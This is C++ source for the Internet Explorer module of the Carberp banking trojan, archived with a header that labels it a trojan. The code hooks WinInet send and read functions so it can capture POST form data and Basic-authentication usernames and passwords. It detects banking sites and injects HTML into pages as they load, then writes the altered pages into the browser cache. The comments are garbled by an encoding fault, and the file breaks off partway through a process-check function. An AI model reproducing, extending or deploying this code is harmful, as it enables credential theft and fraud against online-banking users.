/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include <windows.h>
#include <wininet.h>


#include "InternetExplorer.h"
#include "GetApi.h"
#include "Utils.h"
#include "DllLoader.h"
#include "Memory.h"
#include "Strings.h"
#include "Exploit.h"
#include "BotUtils.h"
#include "Rootkit.h"
#include "Inject.h"
#include "Crypt.h"
#include "Unhook.h"
#include "Splice.h"
#include "Loader.h"
#include "Grabber.h"
#include "Config.h"
#include "Unhook.h"
#include "Screens.h"
#include "ntdll.h"
#include "Requests.h"

#include "Modules.h"


//#include "BotDebug.h"



//��� ������� ������� �� ����� ������ ��� IE
typedef BOOL ( WINAPI *FUNC_HttpSendRequestA )( HINTERNET hRequest, LPCTSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength );
typedef BOOL ( WINAPI *FUNC_HttpSendRequestW )( HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength );

typedef BOOL ( WINAPI *FUNC_HttpSendRequestExA )(HINTERNET hRequest, LPINTERNET_BUFFERSA lpBuffersIn, LPINTERNET_BUFFERSA lpBuffersOut, DWORD dwFlags, DWORD_PTR dwContext );
typedef BOOL ( WINAPI *FUNC_HttpSendRequestExW )(HINTERNET hRequest, LPINTERNET_BUFFERSW lpBuffersIn, LPINTERNET_BUFFERSW lpBuffersOut, DWORD dwFlags, DWORD_PTR dwContext );

typedef BOOL ( WINAPI *FUNC_InternetReadFile )( HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead );

typedef BOOL ( WINAPI *FUNC_InternetReadFileExA )( HINTERNET hFile, LPINTERNET_BUFFERSA lpBuffersOut, DWORD dwFlags, DWORD_PTR dwContext );
typedef BOOL ( WINAPI *FUNC_InternetReadFileExW )( HINTERNET hFile, LPINTERNET_BUFFERSW lpBuffersOut, DWORD dwFlags, DWORD_PTR dwContext );

typedef BOOL ( WINAPI *FUNC_InternetQueryDataAvailable )( HINTERNET hFile, LPDWORD lpdwNumberOfBytesAvailable, DWORD dwFlags, DWORD_PTR dwContext );

typedef BOOL ( WINAPI *FUNC_InternetCloseHandle )( HINTERNET hInternet );
typedef HWND	( WINAPI *PCreateWindowExA		)( DWORD dwExStyle,LPCSTR lpClassName,LPCSTR lpWindowName,DWORD dwStyle,int x,int y,int nWidth,int nHeight,HWND hWndParent,HMENU hMenu,HINSTANCE hInstance,LPVOID lpParam);


typedef HINTERNET (WINAPI *FUNC_HttpOpenRequestA)(HINTERNET hConnect, LPCSTR lpszVerb,
	LPCSTR lpszObjectName, LPCSTR lpszVersion, LPCSTR lpszReferrer, LPCSTR FAR * lplpszAcceptTypes,
	DWORD dwFlags, DWORD_PTR dwContext);

typedef HINTERNET (WINAPI *FUNC_HttpOpenRequestW)(HINTERNET hConnect, LPCWSTR lpszVerb,
	LPCWSTR lpszObjectName, LPCWSTR lpszVersion, LPCWSTR lpszReferrer, LPCWSTR FAR * lplpszAcceptTypes,
	DWORD dwFlags, DWORD_PTR dwContext);


PCreateWindowExA		Real_CreateWindowExA;

FUNC_HttpSendRequestA	  REAL_HttpSendRequestA;
FUNC_HttpSendRequestW	  REAL_HttpSendRequestW;

FUNC_HttpSendRequestExA	  REAL_HttpSendRequestExA;
FUNC_HttpSendRequestExW	  REAL_HttpSendRequestExW;

FUNC_InternetReadFile	  REAL_InternetReadFile;

FUNC_InternetReadFileExA  REAL_InternetReadFileExA;
FUNC_InternetReadFileExW  REAL_InternetReadFileExW;
	
FUNC_InternetQueryDataAvailable REAL_InternetQueryDataAvailable;
FUNC_InternetCloseHandle  REAL_InternetCloseHandle;

FUNC_HttpOpenRequestA REAL_HttpOpenRequestA;
FUNC_HttpOpenRequestW REAL_HttpOpenRequestW;


// ������ ������ ����������� ��������� InternetExplorer
template <class REQUEST, class DATA, class STR_>
void IEDBG_Template(REQUEST Request, DATA Data, STR_ Str)
{
	#ifdef DebugUtils
		PRequest R = (PRequest)Request;
		PCHAR Section = StrLongToString((DWORD)R + (DWORD)R->Owner);
		Debug::MessageEx("InternetExplorer", 0, Section, (PCHAR)Data, (PCHAR)Str);
		STR::Free(Section);
	#endif
}

template <class REQUEST, class DATA, class STR_, class DATA1>
void IEDBG_Template(REQUEST Request, DATA Data, STR_ Str, DATA1 Data1)
{
	#ifdef DebugUtils
		PRequest R = (PRequest)Request;
		PCHAR Section = StrLongToString((DWORD)R + (DWORD)R->Owner);
		Debug::MessageEx("InternetExplorer", 0, Section, (PCHAR)Data, (PCHAR)Str, Data1);
		STR::Free(Section);
	#endif
}

template <class STR>
void IEDBG_Template(STR Str)
{
	#ifdef DebugUtils
		Debug::MessageEx("InternetExplorer", 0, NULL, NULL, (PCHAR)Str);
	#endif
}


#define IEDBG IEDBG_Template<>



HWND WINAPI Hook_CreateWindowExA(DWORD dwExStyle,LPCSTR lpClassName,LPCSTR lpWindowName,DWORD dwStyle,int x,int y,int nWidth,int nHeight,HWND hWndParent,HMENU hMenu,HINSTANCE hInstance,LPVOID lpParam)
{
	// ���������� ���� �� �������
	HWND hWnd = Real_CreateWindowExA( dwExStyle, lpClassName, lpWindowName, dwStyle, x, y, nWidth, nHeight, hWndParent, hMenu, hInstance, lpParam);
	return hWnd;
}

/*                      ��������������� ���������� �������                    */
DWORD WINAPI ReadDataProc(PRequest Request);
void SetCallbackMethod(PRequest Request, INTERNET_STATUS_CALLBACK Method);
void RestoreCallbackMethod(PRequest Request);
void FreeIRRequestData(LPVOID Request);

/*----------------------------------------------------------------------------*/

PCHAR IEUserAgent = NULL; // ���� ����� ������� ������ �������� ����������

PRequestList Requests; // ���������� ������ ��������


void InitIEGlobalData()
{
	// �������������� ������ ����������� ��� ��������� �������� Internet Explorer
	IEUserAgent = NULL;
	Requests = Request::CreateList(NULL, FreeIRRequestData);
}


void FreeIRRequestData(LPVOID Request)
{
	// ��� �������� ������� ��������������� ������ �������� �����
    RestoreCallbackMethod((PRequest)Request);
}

#ifdef HTMLInjectsH
	bool DoInjectIE(PRequest Request)
	{
		// ������������ ����������� ������
		IEDBG(Request, Request->Buffer, "--->> ��������� HTML �������");
		// �������������� ���������� � ������
		Request->Injected = true;

		THTTPSessionInfo Session;

		Session.BrowserType = BROWSER_TYPE_IE;
		Session.UserAgent = IEUserAgent;
		Session.URL = Request->URL;

		bool Res = HTMLInjects::Execute(Request, &Session);

		if (Res)
		{
			IEDBG(Request, Request->Buffer, "--->> ������� ������� ���������");
		}

		return Res;
	}
#endif

//---------------------------------------------------------------------------

PCHAR GetInetOption(HINTERNET Handle, DWORD Option)
{
	// �������� �������� ��� �������� ������
	if (Handle == NULL)
		return NULL;
	PCHAR Result = NULL;
	DWORD Size = 0;
	if (!pInternetQueryOptionA(Handle, Option, NULL, &Size ) && Size != 0)
	{
		Result = STR::Alloc(Size);
		pInternetQueryOptionA(Handle, Option, (LPVOID)Result, &Size);
		if (StrIsEmpty(Result))
			STR::Free2(Result);

	}
	return Result;
}
//---------------------------------------------------------------------------

PCHAR GetHTTPInfo(HINTERNET Handle, DWORD Option)
{
	// �������� �������� ��� �������� ������
	if (Handle == NULL)
		return NULL;
	PCHAR Result = NULL;
	DWORD Size = 0;

	if (!pHttpQueryInfoA(Handle, Option, NULL, &Size, NULL) && Size != 0)
	{
		Result = STR::Alloc(Size);
		pHttpQueryInfoA(Handle, Option, (LPVOID)Result, &Size, NULL);
		if (StrIsEmpty(Result))
			STR::Free2(Result);
	}
	return Result;
}
//---------------------------------------------------------------------------

void UpdateIEUserAgent(HINTERNET Handle)
{
    // �������� ��� ������
	if (IEUserAgent != NULL)
		return;

	HINTERNET Parent;
	DWORD Size = sizeof(HINTERNET);

	pInternetQueryOptionA(Handle, INTERNET_OPTION_PARENT_HANDLE, &Parent, &Size );
	pInternetQueryOptionA(Parent, INTERNET_OPTION_PARENT_HANDLE, &Parent, &Size );


	IEUserAgent = GetInetOption(Parent, INTERNET_OPTION_USER_AGENT);
}
//---------------------------------------------------------------------------

void WINAPI FORMGrabber(PRequest Request)
{
	// ����� ������ POST ������

	if (Request->Method != hmPOST || Request->Optional == NULL )
		return;

	// ��������� ��� ������������ ������

	PCHAR ContentType = GetHTTPInfo((HINTERNET)Request->Owner, HTTP_QUERY_CONTENT_TYPE | HTTP_QUERY_FLAG_REQUEST_HEADERS);

	DWORD dwHash_UrlEncoded = 0x6B3CDFEC;

	if ( CalcHash( ContentType ) != dwHash_UrlEncoded )
	{
		STR::Free(ContentType);
		return;
	}
	STR::Free(ContentType);

	// �������� ��� ������
	UpdateIEUserAgent((HINTERNET)Request->Owner);

    // ���������� ������
	DataGrabber::AddHTMLFormData(Request->URL, Request->Optional, IEUserAgent, BROWSER_TYPE_IE, DATA_TYPE_FORM);
}
//---------------------------------------------------------------------------

PRequest HttpPreSendRequest(HINTERNET Handle, LPVOID Optional, DWORD OptionalLength)
{
	// ������������ ������
	if (Handle == NULL)  return NULL;

	// ������������ ������ GET � POST ������
	PCHAR Method = GetHTTPInfo(Handle, HTTP_QUERY_REQUEST_METHOD);
	if (Method == NULL)
		return NULL;

	THTTPMethod MID = GetMethodFromStr(Method);
	STR::Free(Method);

	if (MID != hmGET  && MID != hmPOST)
		return NULL;


	// ��������� ����� ������
	PRequest Request = Request::Add(Requests, Handle, NULL);
	if (Request == NULL) return NULL;

	Request->URL  = GetInetOption(Handle, INTERNET_OPTION_URL);;
	Request->Method = MID;

	IEDBG(Request, NULL, "������������� ������ �� %s", Request->URL);

	// �������� ������������ ������

	if (Optional != NULL && OptionalLength > 0)
	{
		IEDBG(Request, (PCHAR)Optional, "������������� POST ������");
		Request->Optional = STR::New((PCHAR)Optional, OptionalLength);
		FORMGrabber(Request);
	}

	#ifdef HTMLInjectsH
		Config::GetInjectsForRequest(Request);

		if (Request->IsInject)
		{
			IEDBG(Request, NULL, "�������� �������� �������. ������ ���������.");
			pDeleteUrlCacheEntry(Request->URL);
			pHttpAddRequestHeadersA(Handle, (LPCTSTR)"Accept-Encoding:\n", -1, HTTP_ADDREQ_FLAG_REPLACE );
	//		pHttpAddRequestHeadersA(Handle, (LPCTSTR)"If-Modified-Since:\r\n", -1, HTTP_ADDREQ_FLAG_REPLACE );
	//		pHttpAddRequestHeadersA(Handle, (LPCTSTR)"TE:\r\n", -1, HTTP_ADDREQ_FLAG_REPLACE );
		}
	#endif
    IEDBG(Request, NULL, "������ ������� ���������");
	return Request;
}



BOOL WINAPI HttpSendRequestHandler( BOOL bType, HINTERNET hRequest, LPBYTE lpszHeaders,
									DWORD dwHeadersLength, LPVOID lpOptional,
									DWORD dwOptionalLength )
{
	// �������� ���������� � �������


	#ifdef HunterH
		IsBankHunter(  hRequest );
	#endif

	#ifdef RuBnkH
		IsBank(hRequest );
	#endif


	if (dwHeadersLength != 0)
	{
		if ( bType )
			pHttpAddRequestHeadersA( hRequest, (LPCTSTR)lpszHeaders, dwHeadersLength, HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);
		else
			pHttpAddRequestHeadersW( hRequest, (LPCWSTR)lpszHeaders, dwHeadersLength, HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);
	}

	// ��������� �� ������������� �������� ���������
//	if ( dwOptionalLength )
//	{
//		char *Opt = (char*)lpOptional;
//
//		Opt[ dwOptionalLength ] = '\0'; // ��� ������ ��������� � �����
//
//		if ( CalcHash(Opt) == 0x24DE3210)
//		{
//			StartThread( ScreensThread, NULL );
//		}
//	}

	// ������������ ������
	HttpPreSendRequest(hRequest, lpOptional, dwOptionalLength);

	// �������� ������������ ����� �������

	BOOL ret = 0;

	if ( bType )
		ret = REAL_HttpSendRequestA( hRequest, NULL, dwHeadersLength, lpOptional, dwOptionalLength );
	else
		ret = REAL_HttpSendRequestW( hRequest, NULL, 0, lpOptional, dwOptionalLength );

	return ret;
}


BOOL WINAPI HttpSendRequestExHandler( BOOL bType, HINTERNET hRequest, LPINTERNET_BUFFERSA lpBuffersIn, LPINTERNET_BUFFERSA lpBuffersOut, DWORD dwFlags, DWORD_PTR dwContext )
{
	
	#ifdef HunterH
		IsBankHunter(  hRequest );
	#endif

	#ifdef RuBnkH		
		IsBank(  hRequest );
	#endif
	if ( lpBuffersIn->dwHeadersLength && lpBuffersIn->lpcszHeader )
    {
		if ( bType )
		{
			pHttpAddRequestHeadersA( (HINTERNET)hRequest, (LPCTSTR)lpBuffersIn->lpcszHeader, lpBuffersIn->dwHeadersLength, HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD );
		}
		else
		{
			pHttpAddRequestHeadersW( (HINTERNET)hRequest, (LPCWSTR)lpBuffersIn->lpcszHeader, lpBuffersIn->dwHeadersLength, HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD );
		}

		pHttpAddRequestHeadersA( hRequest, (LPCTSTR)"Accept-Encoding:\n", -1, HTTP_ADDREQ_FLAG_REPLACE );
	}

	BOOL ret;

	if ( bType )
	{
		ret = REAL_HttpSendRequestExA( hRequest, lpBuffersIn, lpBuffersOut, dwFlags, dwContext );
	}
	else
	{
		ret = REAL_HttpSendRequestExW( hRequest, (LPINTERNET_BUFFERSW)lpBuffersIn, (LPINTERNET_BUFFERSW)lpBuffersOut, dwFlags, dwContext );
	}

	return ret;
}
//-----------------------------------------------------------------------------


void CallISC(HINTERNET hInternet, DWORD_PTR dwContext, DWORD dwInternetStatus, LPVOID lpvStatusInformation, DWORD dwStatusInformationLength )
{
	// �������� ����� �������� �����

	INTERNET_STATUS_CALLBACK isc = NULL;
	DWORD s = sizeof(INTERNET_STATUS_CALLBACK);

	if( pInternetQueryOptionA(hInternet, INTERNET_OPTION_CALLBACK, &isc, &s ) && isc)
	{
	  DWORD_PTR t;

	  s = sizeof( DWORD_PTR );

	  if (pInternetQueryOptionA( hInternet, INTERNET_OPTION_CONTEXT_VALUE, &t, &s ) )
		  dwContext = t;

	  isc(hInternet, dwContext, dwInternetStatus, lpvStatusInformation, dwStatusInformationLength );
	}
	else
	{
	  s = sizeof(HINTERNET);

	  if ( pInternetQueryOptionA(hInternet, INTERNET_OPTION_PARENT_HANDLE, &hInternet, &s) )
		  CallISC( hInternet, dwContext, dwInternetStatus, lpvStatusInformation, dwStatusInformationLength );
	}
}
//-----------------------------------------------------------------------------

void CheckBASICAuthorization(PRequest Request)
{
	// ����� ��������� ������� � ������� ���������� � BASIC �����������

	// �������� ��� ������������
	PCHAR User = GetInetOption((HINTERNET)Request->Owner, INTERNET_OPTION_USERNAME);
	if (StrIsEmpty(User))
		return;
	PCHAR Password = GetInetOption((HINTERNET)Request->Owner, INTERNET_OPTION_PASSWORD);

	// ���������� ������
	THTTPSessionInfo Session;
	Session.BrowserType = BROWSER_TYPE_IE;
	Session.URL = Request->URL;
	Session.UserAgent = IEUserAgent;

//	DataGrabber::AddBASICAuthorizationData(&Session, User, Password);
	STR::Free(User);
	STR::Free(Password);

}
//-----------------------------------------------------------------------------


void CallPreviosStatusCallback(INTERNET_STATUS_CALLBACK CallBack,
		HINTERNET Internet, DWORD_PTR Content, DWORD dwInternetStatus,
		LPVOID lpvStatusInformation, DWORD dwStatusInformationLength)
{
	// �������� ����������� ����� �������� �����
	if (CallBack != NULL)
		CallBack(Internet, Content, dwInternetStatus, lpvStatusInformation, dwStatusInformationLength);
}
//-----------------------------------------------------------------------------

void CALLBACK InternetStatusCallback(HINTERNET hInternet, DWORD_PTR dwContext, DWORD dwInternetStatus, LPVOID lpvStatusInformation, DWORD dwStatusInformationLength )
{
	// ������������ ����������� �������� ����� �� ��������� ������� ���������

	PRequest Request = (PRequest)dwContext;

	if (dwInternetStatus == INTERNET_STATUS_REQUEST_COMPLETE)
	{
		if (Request->Entry == MAXDWORD )
			pSetEvent(Request->Event);
		else
			ReadDataProc(Request);
	}

}
//-----------------------------------------------------------------------------

void SetCallbackMethod(PRequest Request, INTERNET_STATUS_CALLBACK Method)
{
	// ������������� ����� �������� �����

	RestoreCallbackMethod(Request);

	DWORD Size = sizeof(DWORD_PTR);

	// ��������� ������ ������
	pInternetQueryOptionA((HINTERNET)Request->Owner, INTERNET_OPTION_CONTEXT_VALUE , &Request->OldContext, &Size );

	// ������������� ���� ������
	Request->OldCallback = pInternetSetStatusCallback((HINTERNET)Request->Owner, Method);
	pInternetSetOptionA((HINTERNET)Request->Owner, INTERNET_OPTION_CONTEXT_VALUE , &Request, sizeof(DWORD_PTR));

}
//-----------------------------------------------------------------------------

void RestoreCallbackMethod(PRequest Request)
{
	// ��������������� ������� �������� �����
	if (Request != NULL && Request->OldCallback != NULL)
	{
		pInternetSetOptionA(Request->Owner, INTERNET_OPTION_CONTEXT_VALUE , &Request->OldContext, sizeof(DWORD_PTR));
		pInternetSetStatusCallback(Request->Owner, Request->OldCallback);

		Request->OldCallback = NULL;
		Request->OldContext = 0;
	}
}
//-----------------------------------------------------------------------------

void WaitCallbackEvent(PRequest Request)
{
	// ������� ������� �������� �����
	// ����� �������������� ���� ��������� ��������� �� �������������
	// ������� Event
	MSG Msg;
	do
	{
		while (pPeekMessageW( &Msg, NULL, 0, 0, PM_REMOVE))
			pDispatchMessageW(&Msg);

	}while (pMsgWaitForMultipleObjects( 1, &Request->Event, FALSE, INFINITE, QS_ALLEVENTS ) != WAIT_OBJECT_0 );

	pResetEvent(Request->Event );
}
//-----------------------------------------------------------------------------


void AddPageToCashe(PRequest Request)
{
	 //  � ������ ��������� ������ � ���������� ����������� � ����������
	 //  ������������ �������� ����������� ������
	 const DWORD dwUrlSize = 1024;
	 WCHAR lpUrl[dwUrlSize];


	 if( (BOOL)pInternetQueryOptionW(Request->Owner, INTERNET_OPTION_URL, lpUrl, &dwUrlSize ) )
	 {
		 DWORD dwCacheSize = 4096;
		 INTERNET_CACHE_ENTRY_INFOW *picei = (INTERNET_CACHE_ENTRY_INFOW *)MemAlloc( dwCacheSize );

		 if( picei )
		 {
			 picei->dwStructSize = sizeof(INTERNET_CACHE_ENTRY_INFOW );

			 if ( (BOOL)pGetUrlCacheEntryInfoW( lpUrl, picei, &dwCacheSize) && picei->lpszLocalFileName && *picei->lpszLocalFileName != 0 )
			 {
				 File::WriteBufferW(picei->lpszLocalFileName, Request->Buffer, Request->BufferSize );
			 }
		 }

		 MemFree( picei );
	 }

}
//-----------------------------------------------------------------------------

DWORD WINAPI ReadDataProc(PRequest Request)
{
	DWORD dwLastError = ERROR_SUCCESS;
	int r = 1;

	if ( Request->Entry == 0 || Request->Entry == MAXDWORD)
	{
		// �������� ���������� �� ��������� �����, �������������� ���
		IEDBG(Request, NULL, "��������� ��������");

		Request->Event = pCreateEventW( NULL, TRUE, FALSE, NULL );

		// ������������� ����� �������� �����
		 SetCallbackMethod(Request, InternetStatusCallback);
	}

	// �������������� ����� �����
    Request::InitializeReceiveData(Request);

	PMemBlockList List = Request->ReceiveList;
	if (List == NULL) return 0;


	INTERNET_BUFFERSA IB;
	ClearStruct(IB);

	IB.dwStructSize = sizeof(INTERNET_BUFFERSA);
	IB.lpvBuffer    = (LPBYTE)Request->ReceiveBuf->Data;

    // ��������� ���� ��������
	for ( ; ; )
	{
		IB.dwBufferLength = Request->ReceiveBuf->Size;

		if ( !REAL_InternetReadFileExA((HINTERNET)Request->Owner, &IB, IRF_NO_WAIT, (DWORD_PTR)Request ) )
		{
			if( ( dwLastError = (DWORD)pGetLastError() ) == ERROR_IO_PENDING )
			{
				if( Request->Entry != MAXDWORD )
				{
					Request->Entry++;
					return 0;
				}

				// ������� ������� �������� �����
				WaitCallbackEvent(Request);
				continue;
			}

			r = 0;
			break;
		}

		dwLastError = ERROR_SUCCESS;

		// ���� ��� ������ ��������� �� ��������� ����
		if (IB.dwBufferLength == 0)
			break;

		MEMBLOCK::AddBlock(List, IB.lpvBuffer, IB.dwBufferLength);
	}

	Request::CloseReceiveData(Request);

	// ����������� �������������� �������
	pCloseHandle(Request->Event);

	// ���������� ����� �������� �����
	RestoreCallbackMethod(Request);

    IEDBG(Request, Request->Buffer, "�������� ��������");


	#ifdef HTMLInjectsH
		// ������������ ����������� ������
		if (r && !Request->Injected)
		{
			if (DoInjectIE(Request))
				AddPageToCashe(Request);
		}
	#endif

	// ������������� ������� ����������� ��������
	Request->FileReaded = true;

	// �������� ������ ����� �������� �����
	if ( Request->Entry > 0 && Request->Entry != MAXDWORD )
	{
		INTERNET_ASYNC_RESULT iar;

		iar.dwError  = dwLastError;
		iar.dwResult = r;
		CallISC((HINTERNET)Request->Owner, (DWORD)Request->OldContext, INTERNET_STATUS_REQUEST_COMPLETE, &iar, sizeof(INTERNET_ASYNC_RESULT));
	}

	return r;
}

//-----------------------------------------------------------------------------

int InjectReadFile(PRequest Request, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead, DWORD_PTR dwContext )
{
	// ������� �������� �����
	int r = 1;

	*lpdwNumberOfBytesRead = 0;

	// ���� �������� ��� �� ��������� �� ��������� � ��������
	if (!Request->FileReaded)
	{
		if (lpBuffer == NULL)
			Request->Entry = MAXDWORD;

		// ��������� ������ �����
		r = ReadDataProc(Request );
	}

	// ���� �������� ��������� �� ����� ������ ��������, �� ���� �������
	if( Request->FileReaded && r && Request->Injected)
	{
		*lpdwNumberOfBytesRead = Request::GetNextDataPart(Request, lpBuffer, dwNumberOfBytesToRead, true);
	}

  return r;
}


void HandleFirstRead(PRequest Request)
{
	// ��������� ��������� BASIC �����������
	CheckBASICAuthorization(Request);

	if (!Request->IsInject) return;

	IEDBG(Request, NULL, "������������ ����� �������:");
	// ��������� ������ ������
	DWORD Status = 0;
	DWORD Size = sizeof(Status);
	pHttpQueryInfoA((HINTERNET)Request->Owner, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &Status, &Size, NULL);

	IEDBG(Request, NULL, "��� ������: %d", Status);
	if (Status != HTTP_STATUS_OK)
	{
		Request->IsInject = false;
		return;
    }


	// ��������� ��� ��������
	#ifdef HTMLInjectsH
		PCHAR ContentType = GetHTTPInfo((HINTERNET)Request->Owner, HTTP_QUERY_CONTENT_TYPE);
		bool Support = HTMLInjects::SupportContentType(ContentType);
		if (!Support)
		{
			Request->IsInject = false;
			IEDBG(Request, NULL, "������� %s �� ��������������!", ContentType);
		}
		STR::Free(ContentType);
	#endif
}

BOOL __stdcall InternetHandler(BYTE bType, HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead, DWORD dwFlags, DWORD_PTR dwContext )
{
	// ������� ��������� ������� ��� ������ � �������� ������ ������
	int r = 0;

	PRequest pRequest = Request::Find(Requests, hFile);

	if (pRequest != NULL)
	{
		// ��� ������ ������� ������ ��������� �������������� ������
		if (!pRequest->FirstHandled)
		{
			pRequest->FirstHandled = true;

		   //	DbgMsg("InternetExplorer", 0, "�����(%d) %s", (DWORD)pRequest->IsInject, pRequest->URL);
			HandleFirstRead(pRequest);

			if (pRequest->IsInject)
				pRequest->AllowClose = pCreateEventW( NULL, TRUE, TRUE, NULL );
		}


		//  ���� ��� ������ � ������ �� �����, �� ���������� ����
		//  ������ ������
		if ( pRequest->IsInject)
		{
            // �� ����� ���������� ������� ����������� ������� �������� �������
			pResetEvent(pRequest->AllowClose);

			if( bType == 0 )
			{
				// ���������� ������ WinInet InternetReadFile
				r = InjectReadFile( pRequest, lpBuffer, dwNumberOfBytesToRead, lpdwNumberOfBytesRead, dwContext );
			}
			else
			if (bType == 1 || bType == 2)
			{
				// ���������� ������ WinInet InternetReadFileExA, InternetReadFileExA
				LPINTERNET_BUFFERSA pib = (LPINTERNET_BUFFERSA)lpBuffer;
				r = InjectReadFile(pRequest, pib->lpvBuffer, pib->dwBufferLength, &pib->dwBufferLength, dwContext);
			}
			else
			if ( bType == 3 )
			{
				// ������������� ����� ��������� ������
				r = InjectReadFile(pRequest, NULL, 0, lpdwNumberOfBytesRead, dwContext);
			}

			// ��������� �������� �������
			pSetEvent(pRequest->AllowClose);

			return r;
		}
	}

	// �������� ����������� ������ ������ � ����������
	if ( bType == 0 )
		r = REAL_InternetReadFile( hFile, lpBuffer, dwNumberOfBytesToRead, lpdwNumberOfBytesRead );
	else
	if ( bType == 1 )
		r = REAL_InternetReadFileExA( hFile, (LPINTERNET_BUFFERSA)lpBuffer, dwFlags, dwContext );
	else
	if ( bType == 2 )
		r = REAL_InternetReadFileExW( hFile, (LPINTERNET_BUFFERSW)lpBuffer, dwFlags, dwContext );
	else
	if ( bType == 3 )
		r = REAL_InternetQueryDataAvailable( hFile, lpdwNumberOfBytesRead, dwFlags, dwContext );


	return r;
}


//----------------------------------------------------------------------------
BOOL __stdcall HOOK_HttpSendRequestA( HINTERNET hRequest, LPCTSTR lpszHeaders,
								   DWORD dwHeadersLength, LPVOID lpOptional,
								   DWORD dwOptionalLength )
{
	return HttpSendRequestHandler( TRUE, hRequest, (LPBYTE)lpszHeaders, dwHeadersLength, lpOptional, dwOptionalLength );
}
//----------------------------------------------------------------------------

BOOL __stdcall HOOK_HttpSendRequestW( HINTERNET hRequest, LPCWSTR lpcwHeaders,
									  DWORD dwHeadersLength, LPVOID lpOptional,
									  DWORD dwOptionalLength )
{
	return HttpSendRequestHandler(FALSE, hRequest, (LPBYTE)lpcwHeaders, dwHeadersLength, lpOptional, dwOptionalLength );
}
//----------------------------------------------------------------------------

BOOL __stdcall HOOK_HttpSendRequestExA( HINTERNET hRequest, LPINTERNET_BUFFERSA lpBuffersIn, LPINTERNET_BUFFERSA lpBuffersOut, DWORD dwFlags, DWORD_PTR dwContext )
{

	return HttpSendRequestExHandler( TRUE, hRequest, lpBuffersIn, lpBuffersOut, dwFlags, dwContext);

}
//-----------------------------------------------------------------------------


BOOL __stdcall HOOK_HttpSendRequestExW( HINTERNET hRequest, LPINTERNET_BUFFERSW lpBuffersIn, LPINTERNET_BUFFERSW lpBuffersOut, DWORD dwFlags, DWORD_PTR dwContext )
{
	return HttpSendRequestExHandler( FALSE, hRequest, (LPINTERNET_BUFFERSA)lpBuffersIn, (LPINTERNET_BUFFERSA)lpBuffersOut, dwFlags, dwContext);

}
//-----------------------------------------------------------------------------


BOOL __stdcall HOOK_InternetReadFile( HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead )
{
	return InternetHandler( 0, hFile, lpBuffer, dwNumberOfBytesToRead, lpdwNumberOfBytesRead, 0, 0);
}
//----------------------------------------------------------------------------

BOOL __stdcall HOOK_InternetReadFileExA( HINTERNET hFile, LPINTERNET_BUFFERSA lpBuffersOut, DWORD dwFlags, DWORD_PTR dwContext )
{
	return InternetHandler(1, hFile, lpBuffersOut, 0, 0, dwFlags, dwContext );
}
//----------------------------------------------------------------------------

BOOL __stdcall HOOK_InternetReadFileExW( HINTERNET hFile, LPINTERNET_BUFFERSW lpBuffersOut, DWORD dwFlags, DWORD_PTR dwContext )
{
	return InternetHandler( 2, hFile, lpBuffersOut, 0, 0, dwFlags, dwContext );
}
//----------------------------------------------------------------------------

BOOL __stdcall HOOK_InternetQueryDataAvailable( HINTERNET hFile, LPDWORD lpdwNumberOfBytesAvailable, DWORD dwFlags, DWORD_PTR dwContext )
{
	return InternetHandler( 3, hFile, NULL, 0, lpdwNumberOfBytesAvailable, dwFlags, dwContext);
}
//----------------------------------------------------------------------------

BOOL WINAPI HOOK_InternetCloseHandle( HINTERNET hInternet )
{
	//  ������� ��������� ����������
	//  ������� ������ �������
	PRequest R = Request::Find(Requests, hInternet);
	if (R != NULL)
	{
		if (R->AllowClose != NULL)
			pWaitForSingleObject(R->AllowClose, INFINITE);
		PRequest R = Request::Find(Requests, hInternet);
		if (R != NULL)
			IEDBG(R, NULL, "���������� �������");
		Request::Delete(Requests, hInternet);
	}

	return REAL_InternetCloseHandle( hInternet );
}
//----------------------------------------------------------------------------

HINTERNET WINAPI HOOK_HttpOpenRequestA(HINTERNET hConnect, LPCSTR lpszVerb,
	LPCSTR lpszObjectName, LPCSTR lpszVersion, LPCSTR lpszReferrer, LPCSTR FAR * lplpszAcceptTypes,
	DWORD dwFlags, DWORD_PTR dwContext)
{
	dwFlags = dwFlags | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_CACHE_WRITE;

	return REAL_HttpOpenRequestA(hConnect, lpszVerb, lpszObjectName,
			lpszVersion, lpszReferrer, lplpszAcceptTypes, dwFlags, dwContext);
}
//----------------------------------------------------------------------------

HINTERNET WINAPI HOOK_HttpOpenRequestW(HINTERNET hConnect, LPCWSTR lpszVerb,
	LPCWSTR lpszObjectName, LPCWSTR lpszVersion, LPCWSTR lpszReferrer, LPCWSTR FAR * lplpszAcceptTypes,
	DWORD dwFlags, DWORD_PTR dwContext)
{
	dwFlags = dwFlags | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_CACHE_WRITE;

	return REAL_HttpOpenRequestW(hConnect, lpszVerb, lpszObjectName,
			lpszVersion, lpszReferrer, lplpszAcceptTypes, dwFlags, dwContext);
}
//----------------------------------------------------------------------------

bool WINAPI IsInternetExplorer()
{
	// ������� ������ ������ ���� ��� ������� � ��������
	// �������� ����������

	WCHAR *ModulePath = (WCHAR*)MemAlloc( MAX_PATH );

	if ( ModulePath == NULL )
	{
		return false;
	}

	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );
	DWORD dwProcessHash = GetNameHash( ModulePath );

	MemFree( ModulePath );

	if ( dwProcessHash == 0x250DFA8F || 
		 dwProcessHash == 0x1D30C46B || 
